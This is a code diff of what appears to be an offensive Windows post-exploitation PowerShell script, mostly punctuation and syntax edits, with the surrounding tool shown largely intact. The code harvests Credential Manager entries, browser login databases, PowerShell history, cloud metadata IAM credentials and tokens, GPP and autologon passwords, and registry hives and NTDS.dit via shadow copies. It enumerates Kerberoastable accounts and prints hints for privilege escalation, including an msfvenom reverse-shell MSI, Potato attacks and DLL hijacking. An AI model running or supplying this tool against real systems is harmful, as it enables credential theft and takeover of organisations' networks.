@@ -256,7 +256,7 @@ Write-Info "Dumping Credential Manager..."
 $cmdkeyOut = cmdkey /list 2>$null
 if ($cmdkeyOut -match "Target:") {
     $cmdkeyOut | Out-File "$credsDir\credential_manager.txt" -ErrorAction SilentlyContinue
-    Write-Hit "Credential Manager has stored credentials — see credentials\credential_manager.txt"
+    Write-Hit "Credential Manager has stored credentials  - see credentials\credential_manager.txt"
 } else {
     $cmdkeyOut | Out-File "$credsDir\credential_manager.txt" -ErrorAction SilentlyContinue
     Write-OK "Credential Manager saved (may be empty)"
@@ -278,7 +278,7 @@ foreach ($d in $dpapDirs) {
     }
 }
 
-# PowerShell history — THE most overlooked credential source
+# PowerShell history  - THE most overlooked credential source
 $psHistPaths = @(
     "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
     "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
@@ -371,7 +371,7 @@ if (Test-Path $rdpPath) {
 $mobaPath = "$env:APPDATA\MobaXterm"
 if (Test-Path $mobaPath) {
     Safe-CopyDir $mobaPath "$credsDir\mobaxterm"
-    Write-Hit "MobaXterm data found — check credentials\mobaxterm\"
+    Write-Hit "MobaXterm data found  - check credentials\mobaxterm\"
 }
 
 # Netrc
@@ -422,7 +422,7 @@ foreach ($browser in $browserProfiles.GetEnumerator()) {
                 }
                 # Local State contains encryption key
                 Safe-Copy "$profileBase\Local State" "$browserDir\$($browser.Key)\Local_State"
-                Write-Hit "$($browser.Key) profile found: $profile — Login Data copied (decrypt with SharpChrome or HackBrowserData)"
+                Write-Hit "$($browser.Key) profile found: $profile  - Login Data copied (decrypt with SharpChrome or HackBrowserData)"
             }
         }
     }
@@ -437,7 +437,7 @@ if (Test-Path $ffBase) {
         foreach ($file in @("logins.json", "key4.db", "cert9.db", "cookies.sqlite", "places.sqlite")) {
             Safe-Copy "$($_.FullName)\$file" "$dest\$file"
         }
-        Write-Hit "Firefox profile found: $($_.Name) — decrypt with firefox_decrypt"
+        Write-Hit "Firefox profile found: $($_.Name)  - decrypt with firefox_decrypt"
     }
 }
 
@@ -507,7 +507,7 @@ try {
         $iamCreds = (Invoke-WebRequest -Uri "http://169.254.169.254/latest/meta-data/iam/security-credentials/$iamRole" -UseBasicParsing -ErrorAction SilentlyContinue).Content
         $userData = (Invoke-WebRequest -Uri "http://169.254.169.254/latest/user-data" -UseBasicParsing -ErrorAction SilentlyContinue).Content
         @("IAM Role: $iamRole", "Credentials: $iamCreds", "UserData: $userData") | Out-File "$cloudDir\aws_metadata.txt"
-        Write-Hit "AWS metadata service accessible — IAM credentials extracted!"
+        Write-Hit "AWS metadata service accessible  - IAM credentials extracted!"
     }
 } catch {}
 
@@ -517,20 +517,20 @@ try {
     if ($azMeta.StatusCode -eq 200) {
         $msiToken = (Invoke-WebRequest -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -Headers @{"Metadata"="true"} -UseBasicParsing -ErrorAction SilentlyContinue).Content
         @("Instance: $($azMeta.Content)", "MSI Token: $msiToken") | Out-File "$cloudDir\azure_metadata.txt"
-        Write-Hit "Azure metadata service accessible — MSI token extracted!"
+        Write-Hit "Azure metadata service accessible  - MSI token extracted!"
     }
 } catch {}
 
 Write-OK "Cloud credentials collected"
 
 # =============================================================================
-# SECTION 7: REGISTRY — HIGH VALUE KEYS
+# SECTION 7: REGISTRY  - HIGH VALUE KEYS
 # =============================================================================
-Invoke-Section "Registry — High Value Keys"
+Invoke-Section "Registry  - High Value Keys"
 $regDir = "$OutputDir\registry"
 $null = New-Item -ItemType Directory -Path $regDir -Force
 
-# Autologon — plaintext password
+# Autologon  - plaintext password
 Write-Info "Checking autologon credentials..."
 $winlogon = Safe-RegQuery "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 if ($winlogon) {
@@ -543,25 +543,25 @@ if ($winlogon) {
     }
 }
 
-# AlwaysInstallElevated — trivial SYSTEM via MSI
-$aieHKCU = (Safe-RegQuery "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer")?.AlwaysInstallElevated
-$aieHKLM = (Safe-RegQuery "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer")?.AlwaysInstallElevated
+# AlwaysInstallElevated  - trivial SYSTEM via MSI
+$aieHKCU = (Safe-RegQuery "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer").AlwaysInstallElevated
+$aieHKLM = (Safe-RegQuery "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer").AlwaysInstallElevated
 if ($aieHKCU -eq 1 -and $aieHKLM -eq 1) {
-    Write-Hit "AlwaysInstallElevated is ENABLED — create malicious MSI for SYSTEM!"
+    Write-Hit "AlwaysInstallElevated is ENABLED  - create malicious MSI for SYSTEM!"
     "AlwaysInstallElevated: HKCU=$aieHKCU HKLM=$aieHKLM" | Out-File "$regDir\always_install_elevated.txt"
 }
 
-# WDigest — plaintext creds in LSASS if enabled
-$wdigest = (Safe-RegQuery "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest")?.UseLogonCredential
+# WDigest  - plaintext creds in LSASS if enabled
+$wdigest = (Safe-RegQuery "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest").UseLogonCredential
 "WDigest UseLogonCredential: $wdigest" | Out-File "$regDir\wdigest.txt" -ErrorAction SilentlyContinue
 if ($wdigest -eq 1) {
-    Write-Hit "WDigest UseLogonCredential=1 — plaintext credentials in LSASS memory!"
+    Write-Hit "WDigest UseLogonCredential=1  - plaintext credentials in LSASS memory!"
 }
 
-# LAPS — if not installed, local admin password is probably the same everywhere
+# LAPS  - if not installed, local admin password is probably the same everywhere
 $laps = Safe-RegQuery "HKLM:\SOFTWARE\Policies\Microsoft Services\AdmPwd"
 if (-not $laps) {
-    Write-Hit "LAPS does not appear to be installed — local admin password may be reused across machines!"
+    Write-Hit "LAPS does not appear to be installed  - local admin password may be reused across machines!"
     "LAPS not found in registry" | Out-File "$regDir\laps_check.txt"
 } else {
     $laps | Format-List | Out-String | Out-File "$regDir\laps_config.txt" -ErrorAction SilentlyContinue
@@ -580,10 +580,10 @@ $lsa = Safe-RegQuery "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa"
 if ($lsa) {
     $lsa | Format-List | Out-String | Out-File "$regDir\lsa_settings.txt" -ErrorAction SilentlyContinue
     if ($lsa.LsaCfgFlags -eq 1 -or $lsa.LsaCfgFlags -eq 2) {
-        Write-Hit "LSA RunAsPPL (Protected Process Light) is enabled — harder to dump LSASS"
+        Write-Hit "LSA RunAsPPL (Protected Process Light) is enabled  - harder to dump LSASS"
     }
     if ($lsa.DisableRestrictedAdmin -eq 1) {
-        Write-Hit "RestrictedAdmin disabled — pass-the-hash for RDP may be possible!"
+        Write-Hit "RestrictedAdmin disabled  - pass-the-hash for RDP may be possible!"
     }
 }
 
@@ -601,7 +601,7 @@ if (Test-Path $runMRU) {
     Write-OK "RunMRU (recently run commands) saved"
 }
 
-# Group Policy Preferences (GPP) passwords — AES key is public
+# Group Policy Preferences (GPP) passwords  - AES key is public
 Write-Info "Checking for GPP passwords in SYSVOL..."
 $gppPaths = @(
     "\\$Domain\SYSVOL\$Domain\Policies",
@@ -617,7 +617,7 @@ foreach ($gppBase in $gppPaths) {
             $content = Get-Content $gppFile.FullName -ErrorAction SilentlyContinue
             if ($content -match 'cpassword') {
                 Safe-Copy $gppFile.FullName "$regDir\gpp\$($gppFile.Name)"
-                Write-Hit "GPP cpassword found in: $($gppFile.FullName) — decrypt with gpp-decrypt!"
+                Write-Hit "GPP cpassword found in: $($gppFile.FullName)  - decrypt with gpp-decrypt!"
             }
         }
     }
@@ -629,7 +629,7 @@ if ($IsAdmin) {
     Safe-RegExport "HKLM\SAM"      "$regDir\hives\sam.reg"
     Safe-RegExport "HKLM\SECURITY" "$regDir\hives\security.reg"
     Safe-RegExport "HKLM\SYSTEM"   "$regDir\hives\system.reg"
-    Write-Hit "Registry hives exported — extract hashes with secretsdump.py"
+    Write-Hit "Registry hives exported  - extract hashes with secretsdump.py"
 }
 
 Write-OK "Registry enumeration complete"
@@ -641,7 +641,7 @@ Invoke-Section "Sensitive File Hunt"
 $filesDir = "$OutputDir\sensitive_files"
 $null = New-Item -ItemType Directory -Path $filesDir -Force
 
-# Unattend / sysprep files — base64 admin passwords from deployment
+# Unattend / sysprep files  - base64 admin passwords from deployment
 Write-Info "Searching for unattend/sysprep files..."
 $unattendPaths = @(
     "C:\unattend.xml", "C:\unattend.txt",
@@ -654,7 +654,7 @@ $unattendPaths = @(
 foreach ($f in $unattendPaths) {
     if (Test-Path $f) {
         Safe-Copy $f "$filesDir\unattend\$(Split-Path $f -Leaf)"
-        Write-Hit "Unattend/sysprep file found: $f — check for base64 admin passwords!"
+        Write-Hit "Unattend/sysprep file found: $f  - check for base64 admin passwords!"
     }
 }
 
@@ -728,7 +728,7 @@ Get-ChildItem "C:\","C:\Users","C:\inetpub","C:\Backup" -Recurse -Include "*.bak
         "$($_.FullName) [$([math]::Round($_.Length/1MB,2)) MB]"
     } | Out-File "$filesDir\backup_files_found.txt" -ErrorAction SilentlyContinue
 $backupCount = (Get-Content "$filesDir\backup_files_found.txt" -ErrorAction SilentlyContinue | Measure-Object -Line).Lines
-if ($backupCount -gt 0) { Write-Hit "$backupCount backup/archive files found — see sensitive_files\backup_files_found.txt" }
+if ($backupCount -gt 0) { Write-Hit "$backupCount backup/archive files found  - see sensitive_files\backup_files_found.txt" }
 
 # Grep for passwords in common text file types
 Write-Info "Grepping for hardcoded credentials in config files..."
@@ -746,7 +746,7 @@ foreach ($dir in $grepDirs) {
 }
 if ($grepResults) {
     $grepResults | Select-Object -First 300 | Out-File "$filesDir\grepped_creds.txt" -ErrorAction SilentlyContinue
-    Write-Hit "Hardcoded credentials found via grep — see sensitive_files\grepped_creds.txt ($($grepResults.Count) hits)"
+    Write-Hit "Hardcoded credentials found via grep  - see sensitive_files\grepped_creds.txt ($($grepResults.Count) hits)"
 }
 
 Write-OK "Sensitive file hunt complete"
@@ -760,7 +760,7 @@ $null = New-Item -ItemType Directory -Path $adDir -Force
 
 # Check if domain-joined
 if ($env:USERDOMAIN -ne $env:COMPUTERNAME) {
-    Write-Info "Domain-joined machine detected — running AD recon..."
+    Write-Info "Domain-joined machine detected  - running AD recon..."
 
     # Domain info
     nltest /dsgetdc:$env:USERDOMAIN 2>$null | Out-File "$adDir\domain_info.txt" -ErrorAction SilentlyContinue
@@ -778,7 +778,7 @@ if ($env:USERDOMAIN -ne $env:COMPUTERNAME) {
     $groupOut | Out-File "$adDir\high_value_groups.txt" -ErrorAction SilentlyContinue
     Write-OK "AD group memberships saved"
 
-    # SPN enumeration (Kerberoastable accounts) — no tools required
+    # SPN enumeration (Kerberoastable accounts)  - no tools required
     Write-Info "Enumerating SPNs (Kerberoastable accounts)..."
     try {
         $searcher = New-Object System.DirectoryServices.DirectorySearcher
@@ -792,7 +792,7 @@ if ($env:USERDOMAIN -ne $env:COMPUTERNAME) {
         }
         if ($spnOut) {
             $spnOut | Out-File "$adDir\kerberoastable_spns.txt" -ErrorAction SilentlyContinue
-            Write-Hit "Kerberoastable SPNs found: $($spnOut.Count) account(s) — see active_directory\kerberoastable_spns.txt"
+            Write-Hit "Kerberoastable SPNs found: $($spnOut.Count) account(s)  - see active_directory\kerberoastable_spns.txt"
         }
     } catch { Write-Warn "SPN enumeration failed: $_" }
 
@@ -848,7 +848,7 @@ if ($env:USERDOMAIN -ne $env:COMPUTERNAME) {
     net accounts /domain 2>$null | Out-File "$adDir\domain_password_policy.txt" -ErrorAction SilentlyContinue
 
 } else {
-    Write-Warn "Machine is not domain-joined — skipping AD recon"
+    Write-Warn "Machine is not domain-joined  - skipping AD recon"
     "Not domain-joined" | Out-File "$adDir\not_domain_joined.txt"
 }
 
@@ -917,7 +917,7 @@ Invoke-Section "Scheduled Tasks & Services"
 $taskDir = "$OutputDir\tasks_services"
 $null = New-Item -ItemType Directory -Path $taskDir -Force
 
-# Scheduled tasks — full verbose output
+# Scheduled tasks  - full verbose output
 Write-Info "Enumerating scheduled tasks..."
 schtasks /query /fo LIST /v 2>$null | Out-File "$taskDir\scheduled_tasks_full.txt" -ErrorAction SilentlyContinue
 
@@ -954,7 +954,7 @@ $domainServices = Get-WmiObject Win32_Service -ErrorAction SilentlyContinue |
     Where-Object { $_.StartName -and $_.StartName -notmatch "LocalSystem|LocalService|NetworkService|NT AUTHORITY|NT SERVICE" }
 if ($domainServices) {
     $domainServices | Select-Object Name,StartName,PathName | Format-Table -AutoSize | Out-String | Out-File "$taskDir\services_as_domain_accounts.txt"
-    Write-Hit "Services running as domain accounts: $($domainServices.Count) — potential credential target"
+    Write-Hit "Services running as domain accounts: $($domainServices.Count)  - potential credential target"
 }
 
 # Unquoted service paths
@@ -963,7 +963,7 @@ $unquoted = Get-WmiObject Win32_Service -ErrorAction SilentlyContinue |
     Where-Object { $_.PathName -notmatch '^"' -and $_.PathName -notmatch '^C:\\Windows' -and $_.PathName -match " " }
 if ($unquoted) {
     $unquoted | Select-Object Name,PathName | Format-Table -AutoSize | Out-String | Out-File "$taskDir\unquoted_service_paths.txt"
-    Write-Hit "Unquoted service paths found: $($unquoted.Count) — check for binary planting!"
+    Write-Hit "Unquoted service paths found: $($unquoted.Count)  - check for binary planting!"
 }
 
 # Weak service binary permissions
@@ -1002,14 +1002,14 @@ foreach ($dir in $pathDirs) {
         try {
             $acl = Get-Acl $dir -ErrorAction Stop
             if ($acl.AccessToString -match "Everyone.*Write|Everyone.*Modify|Users.*Write|Users.*Modify") {
-                Write-Hit "Writable PATH directory: $dir — DLL/EXE hijack possible!"
+                Write-Hit "Writable PATH directory: $dir  - DLL/EXE hijack possible!"
                 "WRITABLE: $dir" | Add-Content "$privescDir\writable_path_dirs.txt" -ErrorAction SilentlyContinue
             }
         } catch {}
     }
 }
 
-# DLL hijacking opportunities — services pointing to writable directories
+# DLL hijacking opportunities  - services pointing to writable directories
 Write-Info "Checking for DLL hijack opportunities..."
 Get-WmiObject Win32_Service -ErrorAction SilentlyContinue | Where-Object { $_.PathName } | ForEach-Object {
     $dir = Split-Path ($_.PathName -replace '"','').Split(' ')[0]
@@ -1017,7 +1017,7 @@ Get-WmiObject Win32_Service -ErrorAction SilentlyContinue | Where-Object { $_.Pa
         try {
             $acl = Get-Acl $dir -ErrorAction Stop
             if ($acl.AccessToString -match "Everyone.*Write|Users.*Write|Users.*Modify") {
-                Write-Hit "DLL hijack candidate — writable service directory: $dir (Service: $($_.Name))"
+                Write-Hit "DLL hijack candidate  - writable service directory: $dir (Service: $($_.Name))"
             }
         } catch {}
     }
@@ -1034,50 +1034,50 @@ Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" -ErrorAction SilentlyCon
     } catch {}
 }
 
-# Writable PSModulePath — module hijack
+# Writable PSModulePath  - module hijack
 $env:PSModulePath.Split(';') | ForEach-Object {
     if ($_ -and (Test-Path $_)) {
         try {
             $acl = Get-Acl $_ -ErrorAction Stop
             if ($acl.AccessToString -match "Everyone.*Write|Users.*Write|Users.*Modify") {
-                Write-Hit "Writable PSModulePath: $_ — PowerShell module hijack possible!"
+                Write-Hit "Writable PSModulePath: $_  - PowerShell module hijack possible!"
             }
         } catch {}
     }
 }
 
 # Always Install Elevated (already checked in registry, summarise here)
-$aieHKCU2 = (Safe-RegQuery "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer")?.AlwaysInstallElevated
-$aieHKLM2 = (Safe-RegQuery "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer")?.AlwaysInstallElevated
+$aieHKCU2 = (Safe-RegQuery "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer").AlwaysInstallElevated
+$aieHKLM2 = (Safe-RegQuery "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer").AlwaysInstallElevated
 if ($aieHKCU2 -eq 1 -and $aieHKLM2 -eq 1) {
-    Write-Hit "AlwaysInstallElevated CONFIRMED — msfvenom -p windows/x64/shell_reverse_tcp -f msi"
+    Write-Hit "AlwaysInstallElevated CONFIRMED  - msfvenom -p windows/x64/shell_reverse_tcp -f msi"
 }
 
 # SeImpersonatePrivilege → Potato attacks
 if ((whoami /priv 2>$null) -match "SeImpersonatePrivilege.*Enabled") {
-    Write-Hit "SeImpersonatePrivilege ENABLED — try PrintSpoofer, GodPotato, JuicyPotatoNG!"
+    Write-Hit "SeImpersonatePrivilege ENABLED  - try PrintSpoofer, GodPotato, JuicyPotatoNG!"
 }
 
 # SeBackupPrivilege → SAM/NTDS dump
 if ((whoami /priv 2>$null) -match "SeBackupPrivilege.*Enabled") {
-    Write-Hit "SeBackupPrivilege ENABLED — can copy SAM/SYSTEM/NTDS.dit regardless of ACLs!"
+    Write-Hit "SeBackupPrivilege ENABLED  - can copy SAM/SYSTEM/NTDS.dit regardless of ACLs!"
 }
 
 # SeDebugPrivilege → LSASS dump
 if ((whoami /priv 2>$null) -match "SeDebugPrivilege.*Enabled") {
-    Write-Hit "SeDebugPrivilege ENABLED — can access LSASS memory for credential dump!"
+    Write-Hit "SeDebugPrivilege ENABLED  - can access LSASS memory for credential dump!"
 }
 
 # UAC bypass potential
 $uac2 = Safe-RegQuery "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
 if ($uac2 -and $uac2.EnableLUA -eq 1 -and $uac2.ConsentPromptBehaviorAdmin -eq 5) {
-    Write-Info "UAC is enabled with default settings — check for UAC bypass techniques"
+    Write-Info "UAC is enabled with default settings  - check for UAC bypass techniques"
 }
 
 # Stored credentials via runas /savecred
 $savedCreds = cmdkey /list 2>$null | Select-String "Target:"
 if ($savedCreds) {
-    Write-Hit "Saved credentials in Credential Manager — try: runas /savecred /user:DOMAIN\admin cmd"
+    Write-Hit "Saved credentials in Credential Manager  - try: runas /savecred /user:DOMAIN\admin cmd"
 }
 
 # Writeable folders for DLL injection in auto-start locations
@@ -1127,12 +1127,12 @@ if ($IsAdmin) {
                 $dst = "$hivesDir\$hive"
                 cmd /c "copy $src $dst" 2>$null
                 if (Test-Path $dst) {
-                    Write-Hit "$hive hive extracted via VSS — run: python3 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL"
+                    Write-Hit "$hive hive extracted via VSS  - run: python3 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL"
                 }
             }
         } else {
-            # No existing shadow — create one
-            Write-Info "No shadow copy exists — attempting to create one..."
+            # No existing shadow  - create one
+            Write-Info "No shadow copy exists  - attempting to create one..."
             $vol = (Get-WmiObject Win32_Volume | Where-Object { $_.DriveLetter -eq "C:" }).DeviceID
             $shadowClass = [WMICLASS]"root\cimv2:Win32_ShadowCopy"
             $result = $shadowClass.Create($vol, "ClientAccessible")
@@ -1144,7 +1144,7 @@ if ($IsAdmin) {
                     $dst = "$hivesDir\$hive"
                     cmd /c "copy $src $dst" 2>$null
                     if (Test-Path $dst) {
-                        Write-Hit "$hive hive extracted via newly created VSS — decrypt with secretsdump!"
+                        Write-Hit "$hive hive extracted via newly created VSS  - decrypt with secretsdump!"
                     }
                 }
             }
@@ -1157,13 +1157,13 @@ if ($IsAdmin) {
         $dst = "$hivesDir\${hive}_reg.hiv"
         $result = reg save "HKLM\$hive" $dst /y 2>&1
         if (Test-Path $dst) {
-            Write-Hit "$hive saved via reg save — see hives\${hive}_reg.hiv"
+            Write-Hit "$hive saved via reg save  - see hives\${hive}_reg.hiv"
         }
     }
 
     # NTDS.dit (Domain Controller only)
     if (Test-Path "C:\Windows\NTDS\NTDS.dit") {
-        Write-Hit "NTDS.dit found — this is a Domain Controller!"
+        Write-Hit "NTDS.dit found  - this is a Domain Controller!"
         Write-Info "Attempting NTDS.dit extraction via VSS..."
         if ($shadow) {
             $src = "$($shadow.DeviceObject)\Windows\NTDS\NTDS.dit"
@@ -1184,7 +1184,7 @@ $null = New-Item -ItemType Directory -Path $dockerDir -Force
 
 # Docker Desktop
 if (Get-Command docker -ErrorAction SilentlyContinue) {
-    Write-Info "Docker found — enumerating..."
+    Write-Info "Docker found  - enumerating..."
     docker ps -a 2>$null | Out-File "$dockerDir\containers.txt" -ErrorAction SilentlyContinue
     docker images 2>$null | Out-File "$dockerDir\images.txt" -ErrorAction SilentlyContinue
     docker network ls 2>$null | Out-File "$dockerDir\networks.txt" -ErrorAction SilentlyContinue
@@ -1207,9 +1207,9 @@ if (Test-Path "$env:APPDATA\Docker") {
     Write-OK "Docker Desktop config copied"
 }
 
-# WSL — access Linux filesystem
+# WSL  - access Linux filesystem
 if (Test-Path "\\wsl$") {
-    Write-Info "WSL detected — looting Linux filesystems..."
+    Write-Info "WSL detected  - looting Linux filesystems..."
     $wslDistros = Get-ChildItem "\\wsl$\" -ErrorAction SilentlyContinue
     foreach ($distro in $wslDistros) {
         $wslLootDir = "$dockerDir\wsl_$($distro.Name)"
@@ -1236,7 +1236,7 @@ $null = New-Item -ItemType Directory -Path $appDir -Force
 # IIS configuration
 if (Test-Path "C:\Windows\System32\inetsrv\config\applicationHost.config") {
     Safe-Copy "C:\Windows\System32\inetsrv\config\applicationHost.config" "$appDir\iis\applicationHost.config"
-    Write-Hit "IIS applicationHost.config found — check app pool credentials"
+    Write-Hit "IIS applicationHost.config found  - check app pool credentials"
     # Extract app pool identities
     $iisConfig = [xml](Get-Content "C:\Windows\System32\inetsrv\config\applicationHost.config" -ErrorAction SilentlyContinue)
     $appPools = $iisConfig.configuration."system.applicationHost".applicationPools.add | 
@@ -1253,7 +1253,7 @@ if (Test-Path "C:\Windows\System32\inetsrv\config\applicationHost.config") {
 $sqlInstances = Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server" -ErrorAction SilentlyContinue
 if ($sqlInstances) {
     $sqlInstances | Format-List | Out-String | Out-File "$appDir\mssql\instances.txt" -ErrorAction SilentlyContinue
-    Write-Hit "MSSQL instances found — see applications\mssql\"
+    Write-Hit "MSSQL instances found  - see applications\mssql\"
 }
 
 # Jenkins
@@ -1284,7 +1284,7 @@ foreach ($jPath in $jenkinsPaths) {
     }
 }
 
-# Git repos — check for stored credentials
+# Git repos  - check for stored credentials
 Get-ChildItem "C:\","C:\Users","C:\inetpub","C:\Projects" -Recurse -Filter ".git" -ErrorAction SilentlyContinue -Force | 
     Where-Object { $_.PSIsContainer } | Select-Object -First 20 | ForEach-Object {
         $repoPath = $_.FullName
@@ -1298,13 +1298,13 @@ Get-ChildItem "C:\","C:\Users","C:\inetpub","C:\Projects" -Recurse -Filter ".git
 Write-OK "Application credentials enumerated"
 
 # =============================================================================
-# SECTION 16: LOGS — HIGH VALUE
+# SECTION 16: LOGS  - HIGH VALUE
 # =============================================================================
 Invoke-Section "High-Value Event Logs"
 $logsDir = "$OutputDir\logs"
 $null = New-Item -ItemType Directory -Path $logsDir -Force
 
-# Security log — logon events
+# Security log  - logon events
 Write-Info "Extracting security event log..."
 try {
     Get-WinEvent -LogName Security -MaxEvents 500 -ErrorAction Stop | 
@@ -1315,7 +1315,7 @@ try {
     Write-OK "Security events saved (IDs: 4624,4625,4648,4672,4720,4728,4732,4756)"
 } catch { Write-Warn "Could not read Security log (may need admin)" }
 
-# PowerShell operational — script block logging
+# PowerShell operational  - script block logging
 Write-Info "Extracting PowerShell script block logs..."
 try {
     Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 200 -ErrorAction Stop |
@@ -1347,7 +1347,7 @@ try {
         Out-File "$logsDir\application_errors.txt" -ErrorAction SilentlyContinue
 } catch {}
 
-# IIS access logs — grep for credentials in query strings
+# IIS access logs  - grep for credentials in query strings
 foreach ($iisLogDir in @("C:\inetpub\logs\LogFiles","C:\Windows\System32\LogFiles\W3SVC1")) {
     if (Test-Path $iisLogDir) {
         Get-ChildItem $iisLogDir -Recurse -Filter "*.log" -ErrorAction SilentlyContinue | 
